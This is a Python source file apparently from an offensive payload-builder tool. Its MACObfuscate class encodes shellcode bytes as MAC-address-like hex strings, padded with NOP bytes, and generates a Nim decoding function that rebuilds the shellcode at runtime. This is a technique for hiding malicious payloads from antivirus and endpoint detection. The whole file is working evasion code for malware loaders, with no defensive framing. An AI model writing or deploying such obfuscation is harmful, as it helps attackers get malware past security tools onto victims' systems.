import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['import strutils']

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.decodedSize = len(decoded)
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
func {self.name}(encoded: seq[string]): seq[byte] = 
    var decoded = newSeq[byte]({self.size} * 6)
    for i in 0 ..< len(encoded):
        let address = encoded[i]
        let bytes = address.split('-')
        for j in 0 ..< len(bytes):
            let converted = parseHexInt(bytes[j])
            decoded[i*6 + j] = byte(converted)

    result = decoded[0..{self.decodedSize - 1}]
"""